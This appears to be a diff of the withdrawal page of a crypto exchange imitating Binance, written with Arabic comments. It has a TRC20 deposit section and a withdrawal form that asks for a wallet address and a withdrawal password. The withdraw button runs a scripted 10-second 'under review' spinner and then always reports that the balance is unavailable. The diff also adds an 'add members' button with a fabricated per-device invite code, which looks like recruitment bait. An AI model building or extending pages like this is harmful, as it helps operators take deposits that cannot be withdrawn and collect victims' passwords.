@@ -7,7 +7,7 @@
   <link rel="stylesheet" href="home.css">
   <link rel="stylesheet" href="https://cloudflare.com">
   <style>
-    /* كارت الرصيد الداكن */
+    /* كارت الرصيد الداكن الاحترافي */
     .balance-card {
       background-color: #181a20 !important;
       border-radius: 12px;
@@ -57,7 +57,7 @@
       cursor: pointer;
     }
 
-    /* شريط لودينج الإيداع الأزرق التنازلي السفلي */
+    /* شريط لودينج الإيداع التنازلي */
     .deposit-loading-bar {
       width: 100%;
       background-color: #2b3139;
@@ -77,7 +77,7 @@
       to { width: 0%; }
     }
 
-    /* حاوية العداد التنازلي المحدثة بالدائرة التي تدور */
+    /* حاوية العداد التنازلي مع الدائرة التي تدور */
     .countdown-timer-container {
       display: flex;
       justify-content: center;
@@ -103,7 +103,7 @@
       font-size: 15px;
     }
 
-    /* تعديل لون زر السحب إلى الأخضر */
+    /* زر سحب الأموال الأخضر */
     .withdraw-submit-btn {
       background-color: #0ecb81 !important; 
       color: white !important;
@@ -116,7 +116,7 @@
       font-size: 16px;
     }
 
-    /* شاشة اللودينج الدائرية المنبثقة الخضراء للسحب (تنتظر 10 ثوانٍ) */
+    /* شاشة اللودينج الدائرية الخضراء للسحب */
     .loading-overlay {
       display: none;
       position: fixed;
@@ -135,7 +135,7 @@
       width: 70px;
       height: 70px;
       border: 6px solid #eef1f4;
-      border-top: 6px solid #0ecb81; /* النصف الأخضر مثل صورتك تماماً */
+      border-top: 6px solid #0ecb81;
       border-radius: 50%;
       animation: spin 1.2s linear infinite;
     }
@@ -147,35 +147,32 @@
       color: #ffffff;
       font-size: 16px;
       font-weight: bold;
-      font-family: Arial, sans-serif;
     }
   </style>
 </head>
 <body>
 
-<!-- شاشة الانتظار المخصصة لعملية السحب (تظهر لمدة 10 ثوانٍ) -->
+<!-- شاشة الانتظار لعملية السحب (10 ثوانٍ) -->
 <div id="loadingOverlay" class="loading-overlay">
   <div class="spinner-circle"></div>
   <div class="loading-text">جاري المراجعه يرجى الانتظار...</div>
 </div>
 
 <div class="withdraw-page-container">
-  <!-- بطاقة الرصيد الداكنة -->
+  <!-- بطاقة الرصيد الداكنة المحدثة مثل الصورة -->
   <div class="balance-card">
     <div class="balance-label">
       Assets, total <i class="fas fa-chevron-up" style="font-size:8px;"></i><i class="fas fa-chevron-down" style="font-size:8px; margin-right:-3px;"></i>
     </div>
-    <h2 class="balance-amount">0.00 USDT</h2>
+    <h2 class="balance-amount">USDT 0.00</h2>
     <div class="balance-stats">
-      <span class="stat-green">+0.00 · 0.00%</span>
       <span class="stat-badge">for today</span>
+      <span class="stat-green">0.00% · 0.00+</span>
     </div>
-    <button type="button" class="deposit-trigger-btn" onclick="openDepositSection()">
-      <i class="fas fa-wallet"></i> شحن الحساب
-    </button>
+    <button type="button" class="deposit-trigger-btn" onclick="openDepositSection()">شحن الحساب</button>
   </div>
 
-  <!-- واجهة الدفع والشحن -->
+  <!-- واجهة الدفع والشحن المتبقية للايداع -->
   <div id="depositSection" class="deposit-container" style="display: none;">
     <div class="deposit-header">
       <h3>عملية الدفع TRC20</h3>
@@ -197,8 +194,7 @@
       <button type="button" class="copy-btn" onclick="copyAddress()">نسخ العنوان <i class="far fa-copy"></i></button>
     </div>
   </div>
-
-  <!-- نموذج طلب السحب المحدث بكافة التعديلات اللغوية والنصية -->
+    <!-- نموذج طلب السحب المطور -->
   <form id="withdrawForm" class="withdraw-form" onsubmit="event.preventDefault();">
     <div class="form-group">
       <label class="group-label">Network</label> 
@@ -219,16 +215,21 @@
       <input type="password" class="styled-input" id="fundPassword" placeholder="أدخل كلمة مرور السحب" required>
     </div>
 
-    <!-- رسالة الخطأ النهائية المحدثة بنصك الخاص -->
     <div id="errorMessage" class="error-toast-message" style="display:none; color:#f23645; gap:8px; align-items:center; margin-top:15px;">
       <i class="fas fa-exclamation-circle"></i> فشل رصيدك غير متاح
     </div>
 
     <button type="button" onclick="handleWithdraw()" class="withdraw-submit-btn">سحب الأموال</button>
+
+    <!-- إضافة زر أضـافه أعـضاء متبوعاً بقارئ كود الدعوة العشوائي الذكي المحفوظ -->
+    <div style="margin-top: 20px; text-align: center; padding-bottom: 20px;">
+      <button type="button" style="width: 100%; background-color: #0066ee !important; color: white !important; padding: 14px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer; font-size: 16px;">أضـافه أعـضاء</button>
+      <p id="inviteCodeText" style="color: #848e9c !important; font-size: 14px; margin-top: 10px; font-weight: bold; letter-spacing: 0.5px;">رمز الدعوه الخاص بك جاري التوليد...</p>
+    </div>
   </form>
 </div>
 
-<!-- شريط التنقل السفلي الاحترافي المحمي من الأعطال والمطابق لهوية موقعك -->
+<!-- شريط التنقل السفلي الأصلي لتطبيقك -->
 <div class="binance-bottom-nav">
   <a href="account.html" class="binance-nav-item">
     <i class="fas fa-user"></i>
@@ -282,7 +283,6 @@ function copyAddress() {
   });
 }
 
-// دالة السحب الذكية مع لودينج أخضر يدور 10 ثوانٍ متبوعاً برسالة الفشل
 function handleWithdraw() {
   const address = document.getElementById('walletAddress').value.trim();
   const password = document.getElementById('fundPassword').value.trim();
@@ -294,16 +294,42 @@ function handleWithdraw() {
       return;
   }
 
-  // إظهار اللودينج الدائري الأخضر وإخفاء رسالة الخطأ السابقة
   loader.style.display = 'flex';
   errorDiv.style.display = 'none';
 
-  // تنفيذ الانتظار الفعلي لمدة 10 ثوانٍ (10000 مللي ثانية)
   setTimeout(() => {
-      loader.style.display = 'none'; // إخفاء اللودينج
-      errorDiv.style.display = 'flex'; // إظهار رسالة الفشل المكتوبة
+      loader.style.display = 'none'; 
+      errorDiv.style.display = 'flex'; 
   }, 10000);
 }
+
+// دالة توليد الرمز العشوائي الفردي وحفظه بشكل دائم لكل هاتف/جهاز على حدة
+function generateDeviceInviteCode() {
+    const inviteElement = document.getElementById("inviteCodeText");
+    if (!inviteElement) return;
+
+    let deviceCode = localStorage.getItem("userInviteCode");
+
+    if (!deviceCode) {
+        const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ';
+        const nums = '123456789';
+        let randomNums = '';
+        let randomChars = '';
+        
+        for (let i = 0; i < 4; i++) {
+            randomNums += nums.charAt(Math.floor(Math.random() * nums.length));
+        }
+        for (let i = 0; i < 2; i++) {
+            randomChars += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        deviceCode = randomNums + randomChars;
+        localStorage.setItem("userInviteCode", deviceCode);
+    }
+
+    inviteElement.innerHTML = `رمز الدعوه الخاص بك <span style="color: #0066ee; font-weight: bold;">${deviceCode}</span>`;
+}
+
+window.addEventListener("DOMContentLoaded", generateDeviceInviteCode);
 </script>
 
 </body>
